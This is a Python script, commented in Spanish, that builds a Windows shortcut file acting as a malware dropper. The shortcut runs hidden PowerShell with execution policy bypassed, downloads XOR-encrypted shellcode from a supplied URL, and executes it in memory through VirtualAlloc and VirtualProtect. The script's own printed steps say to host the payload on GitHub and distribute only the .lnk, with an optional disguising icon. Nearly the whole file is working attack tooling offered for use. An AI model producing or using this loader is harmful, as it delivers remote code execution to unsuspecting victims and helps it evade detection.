#!/usr/bin/env python3
"""
Crear LNK que ejecuta PowerShell in-memory loader
"""

import sys
import win32com.client
from pathlib import Path

def create_ps_lnk(payload_url, xor_key, output_lnk, icon_path=None):
    """Crear LNK con PowerShell inline que carga shellcode en memoria"""
    
    output_lnk = str(Path(output_lnk).absolute())
    
    print(f"[🔗] Creando acceso directo PowerShell in-memory...")
    print(f"    Payload URL: {payload_url}")
    print(f"    LNK: {output_lnk}")
    
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortcut(output_lnk)
    
    # Target: powershell.exe
    shortcut.TargetPath = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    
    # PowerShell inline completo (todo en una línea)
    ps_cmd = f'''$u='{payload_url}';$k='{xor_key}';$e=(New-Object Net.WebClient).DownloadString($u);$b=[Convert]::FromBase64String($e);$kb=[Text.Encoding]::UTF8.GetBytes($k);$s=New-Object byte[] $b.Length;for($i=0;$i -lt $b.Length;$i++){{$s[$i]=$b[$i] -bxor $kb[$i % $kb.Length]}};Add-Type -T @'
using System;using System.Runtime.InteropServices;
public class W{{[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,uint s,uint p,out uint o);}}
'@;$a=[W]::VirtualAlloc(0,$s.Length,0x3000,0x04);[Runtime.InteropServices.Marshal]::Copy($s,0,$a,$s.Length);$o=0;[W]::VirtualProtect($a,$s.Length,0x20,[ref]$o)|Out-Null;$r=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($a,[Action]);$r.Invoke()'''
    
    shortcut.Arguments = f'-NoP -NonI -W Hidden -Exec Bypass -C "{ps_cmd}"'
    
    # Working directory
    shortcut.WorkingDirectory = "%USERPROFILE%"
    
    # Ventana oculta
    shortcut.WindowStyle = 7
    
    # Icono
    if icon_path:
        shortcut.IconLocation = f"{Path(icon_path).absolute()},0"
        print(f"    Icono: {icon_path}")
    
    shortcut.Save()
    
    print(f"[✅] LNK creado exitosamente")
    print(f"\n[💡] Ventajas:")
    print(f"    ✅ Todo el código PowerShell está embebido en el LNK")
    print(f"    ✅ Solo necesitas subir: agent_shellcode.enc a GitHub")
    print(f"    ✅ Sin archivos .ps1 externos")
    print(f"    ✅ Ejecución completamente en memoria")
    print(f"\n[📝] Próximos pasos:")
    print(f"    1. Subir agent_shellcode.enc a GitHub")
    print(f"    2. Distribuir solo el .lnk")

if __name__ == '__main__':
    import argparse
    
    parser = argparse.ArgumentParser(description='Crear LNK para shellcode in-memory')
    parser.add_argument('--payload-url', required=True, help='URL del shellcode cifrado (.enc)')
    parser.add_argument('--xor-key', required=True, help='Clave XOR usada para cifrar')
    parser.add_argument('--output', required=True, help='Nombre del .lnk')
    parser.add_argument('--icon', help='Ruta al icono .ico')
    
    args = parser.parse_args()
    
    create_ps_lnk(args.payload_url, args.xor_key, args.output, args.icon)
